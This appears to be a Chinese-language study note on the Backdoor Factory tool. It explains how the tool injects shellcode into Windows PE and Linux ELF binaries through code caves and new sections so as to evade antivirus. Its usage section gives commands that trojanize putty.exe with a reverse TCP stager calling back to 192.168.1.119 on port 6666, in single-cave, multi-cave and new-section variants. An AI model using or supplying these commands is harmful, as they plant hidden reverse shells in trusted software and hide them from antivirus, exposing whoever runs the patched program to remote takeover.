
# Backdoor-factory


* 描述
> * Patch
>   - 通过替换EXE、DLL、注册表等方法修复系统漏洞或问题的方法
>   - BDF：向二进制文件中增加或者删除代码内容
>       - 某些受保护的二进制程序无法patch
>       - 存在一定概率文件会被patch坏掉
> * 后门工厂
>   - 适用于windows PE x32/x64 和 Linux ELF x32/x64 ( OSX )
>   - 支持msf payload 、自定义payload
> * 将shellcode代码patch进模板文件，躲避AV检查
> * Python 语言编写

* 原理
> * CTP 方法
>   - 增加新的代码段 section，与MSF的 -k 方法类似
>   - 使用现有的代码裂缝/洞（code  cave）存放 shellcode
> * 代码洞
>   - 二进制文件中超过两个字节的连续 x00 区域（代码片段间区域）
>   - 根据统计判断代码洞是编译器在进行编译时造成的，不同的编译器造成的代码洞的大小不同
> * 单个代码洞大小不足以存放完整的shellcode
>   - 多代码洞跳转（非顺序执行）
>       - 初期免杀率可达100%  
>       - 结合msf的stager方法  
> * Patch 选项
>   - 附加代码段
>   - 单代码洞注入
>   - 多代码洞注入

* 使用
``` 
// shell
// 检查二进制文件是否支持代码注入
backdoor-factory -f putty.exe –S
// 显示可用payload
backdoor-factory -f putty.exe -s show
iat_reverse_tcp_stager_threaded
// 查看cave大小
ackdoor-factory -f putty.exe -c -l

// 单代码洞注入
backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.1.119  -P 6666
// 多代码洞注入   -J
backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.1.119  -P 6666  –J
// 新建代码洞注入 -a
backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H  192.168.1.119 -P 6666
```

* 与 veil-evasion 集成
